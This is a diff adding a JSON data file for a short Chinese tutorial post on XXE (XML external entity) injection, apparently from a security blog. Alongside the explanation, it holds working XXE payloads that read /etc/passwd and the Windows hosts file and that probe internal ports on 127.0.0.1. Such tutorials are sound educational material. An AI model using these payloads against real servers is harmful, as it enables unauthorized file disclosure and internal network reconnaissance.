@@ -1,0 +1,135 @@
+{
+  "format": "blocks",
+  "no": "009",
+  "category": "网络安全",
+  "title": "XXE 外部实体注入漏洞",
+  "date": "2026-08-12",
+  "readingMinutes": 3,
+  "words": 1209,
+  "excerpt": "xml external entity injection XXE漏洞的原理是利用XML语言的实体绑定时，支持多种网络协议，通过这些协议即可执行不同的攻击操作",
+  "body": [
+    {
+      "type": "p",
+      "text": "*xml external entity injection*\nXXE漏洞的原理是利用XML语言的实体绑定时，支持多种网络协议，通过这些协议即可执行不同的攻击操作"
+    },
+    {
+      "type": "p",
+      "text": "概括一下就是\"攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题\"\n也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。"
+    },
+    {
+      "type": "p",
+      "text": "具体的关于xml实体的介绍,网络上有很多,自己动手先查一下。\n现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。\n以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。"
+    },
+    {
+      "type": "h2",
+      "text": "任意文件读取"
+    },
+    {
+      "type": "p",
+      "text": "举例："
+    },
+    {
+      "type": "code",
+      "lang": "xml",
+      "text": "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE root [\n     <!ENTITY hello \"world\">     <!--在页面中查看时，root节点处就会显示hello实体的值world -->\n      <!ENTITY hello SYSTEM \"file:///etc/passwd\">     <!--使用SYSTEM字段指定访问本地的实体资源，引号内填写url或uri，指向本地资源 如示例的file协议，就会将服务器本地的文件显示出来造成任意文件读取 -->\n]>      <!--这里规定了文档的根类型，root即要求下面的文档根节点必须是root  []内的内容就是自定义实体，可以指定，也可以从本地或网络上读取-->\n<root>&hello;</root>\n"
+    },
+    {
+      "type": "h2",
+      "text": "内网探活"
+    },
+    {
+      "type": "p",
+      "text": "使用http协议加bp的attacker模块"
+    },
+    {
+      "type": "code",
+      "lang": "xml",
+      "text": "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE root [\n       <!ENTITY hello SYSTEM \"http://127.0.0.1:80\">   <!--抓到包，发到attack模块，动态修改端口位置的值，攻击后根据响应的时长判断端口是否开放   -->\n]>     \n<root>&hello;</root>"
+    },
+    {
+      "type": "h2",
+      "text": "不同的程序支持的协议不同："
+    },
+    {
+      "type": "table",
+      "head": [
+        "libxml2",
+        "PHP",
+        "Java",
+        ".NET"
+      ],
+      "align": [
+        "left",
+        "left",
+        "left",
+        "left"
+      ],
+      "rows": [
+        [
+          "file",
+          "file",
+          "http",
+          "file"
+        ],
+        [
+          "http",
+          "http",
+          "https",
+          "http"
+        ],
+        [
+          "ftp",
+          "ftp",
+          "ftp",
+          "https"
+        ],
+        [
+          "",
+          "php",
+          "file",
+          "ftp"
+        ],
+        [
+          "",
+          "compress.zlib",
+          "jar",
+          ""
+        ],
+        [
+          "",
+          "compress.bzip2",
+          "netdoc",
+          ""
+        ],
+        [
+          "",
+          "data",
+          "mailto",
+          ""
+        ],
+        [
+          "",
+          "glob",
+          "gopher *",
+          ""
+        ],
+        [
+          "",
+          "phar",
+          "",
+          ""
+        ]
+      ]
+    },
+    {
+      "type": "code",
+      "lang": "xml",
+      "text": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [<!ENTITY a \"world\">] >\n<root>&a;</root>"
+    },
+    {
+      "type": "code",
+      "lang": "xml",
+      "text": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [<!ENTITY a SYSTEM \"file:///C:/Windows/System32/drivers/etc/hosts\">] >\n<root>&a;</root>"
+    }
+  ]
+}
